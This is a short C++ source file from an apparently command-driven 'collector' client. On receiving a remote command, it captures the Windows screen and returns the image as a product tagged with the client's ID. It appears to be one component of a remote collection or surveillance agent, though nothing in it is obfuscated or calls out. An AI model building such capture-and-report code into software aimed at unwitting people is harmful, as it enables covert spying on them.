#include <base64.hpp>

#include "CommandHandlers/ScreenshotHandler.h"
#include "Protocol/ReturnProductRequest.h"
#include "Commands/CommandFactory.h"
#include "Products/ScreenshotProduct.h"
#include "Windows/WinUtils.h"
using namespace xp_collector;


ScreenshotHandler::ScreenshotHandler(std::string client_id)
	: ICommandHandler(std::move(client_id))
{
}

std::unique_ptr<IRequest> ScreenshotHandler::handle(std::shared_ptr<BasicCommand>& command)
{
	std::string bmp_buffer = windows::take_screenshot();
	return std::make_unique<ReturnProductRequest>(
		RequestHeader{RequestType::ReturnProduct, m_client_id},
		std::make_unique<ScreenshotProduct>(
			command->get_command_id(), command->get_command_type(),
			std::move(bmp_buffer)
		)
	);
}
